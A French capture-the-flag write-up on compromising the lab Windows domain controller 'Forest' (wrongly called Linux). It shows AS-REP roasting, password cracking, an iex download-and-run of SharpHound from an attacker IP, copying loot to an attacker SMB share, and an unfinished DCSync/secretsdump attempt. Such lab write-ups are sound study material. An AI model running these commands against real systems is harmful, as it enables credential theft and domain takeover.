![Pic1](../img/forest1.PNG?raw=true) </br>

# Introduction

Forest est une machine linux dont l'adresse IP est 10.10.10.161.</br>
Compétences mises en oeuvre :
* Enumération des ports et services d'une machine distante.
* 
</br>

# Enumération initiale
Nous commençons par l'énumération des services et ports de la box avec nmap :
```bash
$ nmap -T4 -A 10.10.10.161
```
![Pic2](../img/forest2.PNG?raw=true) </br>
Plusieurs ports ouverts, on peut déjà tenter une énumération des dossiers partagés par SMB :
```bash
$ smbmap -H 10.10.10.161
```
![Pic3](../img/forest3.PNG?raw=true) </br>
Aucun partage dispo.</br>
On peut faire une énumération RPC avec rpcclient :
```bash
$ rpcclient -U "" -N 10.10.10.161
rpcclient > enumdomusers
```
![Pic4](../img/forest4.PNG?raw=true) </br>
![Pic5](../img/forest5.PNG?raw=true) </br>

# Obtenir un accès utilisateur
En ayant la liste des utilisateurs, nous pouvons tenter d'obtenir un ticket Kerberos pour chacun, cela fonctionnera que pour le compte
svc-alfresco :
```bash
$ GetNPUsers -no-pass -dc-ip 10.10.10.161 htb/svc-alfresco
```
![Pic6](../img/forest6.PNG?raw=true) </br>

Nous pouvons le cracker avec john :
```bash
$ john hash --wordlist=/usr/share/wordlists/rockyou.txt
```
![Pic7](../img/forest7.PNG?raw=true) </br>
Nous pouvons alors nous connecter via le port 5985 avec Evil-WinRM et lire le user.txt :
```bash
$ evil-winrm -i 10.10.10.161 -u "svc-alfresco" -p "s3rvice"
> cat ../Desktop/user.txt
```
![Pic8](../img/forest8.PNG?raw=true) </br>

# Obtenir un accès administrateur
Nous allons utiliser l'outil Bloodhound, pour ce faire, il faut :
* Upload SharpHound sur la box et l'éxécuter.
* Envoyé le résultat de SharpHound vers l'attaquant.
* Charger le résultat dans Bloodhound.
* Analyser le résultat pour voir l'exploit.
* Exploitation.

## Upload SharpHound sur la box et l'éxécuter
Coté attaquant :
```bash
$ cp /opt/bloodhound/Collectors/SharpHound.ps1 ./
$ python3 -m http.server
```
Coté box :
```bash
> cd C:\Users\svc-alfresco\appdata\local\temp
> iex(new-object net.webclient).downloadstring("http://10.10.14.34:8000/SharpHound.ps1")
> dir
```
![Pic9](../img/forest9.PNG?raw=true) </br>
Nous pouvons voir le fichier 20201124130216_BloodHound.zip qui contient le résultat des données récoltées par SharpHound.

## Envoyé le résultat de SharpHound vers l'attaquant
Coté attaquant :
```bash
$ smbserver.py share . -smb2support -username df -password df
```
![Pic10](../img/forest11.PNG?raw=true) </br>
Coté box :
```bash
> net use \\10.10.14.34\share /u:df df
> copy 20201124130216_BloodHound.zip \\10.10.14.34\share\
> del 20201124130216_BloodHound.zip
> net use /d \\10.10.14.34\share
```
![Pic11](../img/forest10.PNG?raw=true) </br>

## Charger le résultat dans Bloodhound
On lance neo4j et bloodhound :
```bash
$ neo4j console
$ bloodhound
```
</br>
Maintenant nous importons les données dans bloodhound :</br>

![Pic12](../img/forest12.PNG?raw=true) </br>
Une fois finit, on va faire une recherche pour trouver le chemin le plus court vers l'administrateur du domaine :</br>

![Pic13](../img/forest13.PNG?raw=true) </br>
Nous avons alors un résultat graphique très sympa :</br>

![Pic14](../img/forest14.PNG?raw=true) </br>
Il faut savoir, que sur chaque arête se trouve un élément (Member of / contain / Genericall ..) et si on clique droit sur cet élément
et que l'on clique sur Help, Bloodhound nous donne un descriptif très complet. Dans notre cas, on a GenericAll et WriteDacl qui, dans l'help, ont une rubrique "Abuse Info" pour 
expliquer en détail comment exploiter l'élément.

## Analyser le résultat pour voir l'exploit
En visualisant le graphique, on peut voir qu'il faudra deux jumps pour accéder à l'Administrateur depuis 
svc-alfresco. Notre utilisateur étant déjà dans le groupe Privileged IT Account, qui lui même est dans le groupe Account Operators, qui ce dernier,
si on clique sur le nom de son arête "GenericAll" nous permet de voir que ce groupe a tous les pouvoirs sur Exchange Windows Permissions. Donc il nous faudra ajouter notre compte
dans le groupe, puis à partir de ce moment là, le groupe Exchange Windows Permissions a les permissions de modifier le DACL (Discretionary Access Control List), donc nous pourrons
nous donner le privilège DcSync dans le but de dump le hash de l'admin.</br>
En résumer :
* On se rajoute dans le groupe Exchange Windows Permissions (via commande powershell).
* On se donne le privilège DcSync (via commande powershell).
* On fait un dump du hash admin (via mimikatz ou secretdump.py).

## Exploitation
Alors pour cette partie, rien ne passe, même en utilisant les solutions des autres write-up, la version de powershell de la box est 1.</br>
J'ai tenté d'avoir le privilège DCSync par commande powershell et par aclpwn mais en powershell les commandes n'existent pas, et avec
aclpwn j'ai problème sur problème. Je reviendrai peut être un jour (non.) pour finir.
On peut bien rentrer dans le groupe Exchange Windows Permissions mais pas plus. La commande Add-domainObjectAcl n'existe pas sur powershell V1.
```bash
Evil-winRM > Add-ADGroupMember -Identity 'Exchange Windows Permissions' -Members svc-alfresco;
#Add-DomainObjectAcl -Credential $Cred -PrincipalIdentity 'svc-alfresco' -TargetIdentity 'HTB.LOCAL\Domain Admins' -Rights DCSync
```
Si tout ce serai bien passé, on aurai juste eu à récolter les hash et à s'identifier avec (toujours avec evil-winrm) :
```bash
$ secretsdump.py svc-alfresco:s3rvice@10.10.10.161
$ evil-winrm 
```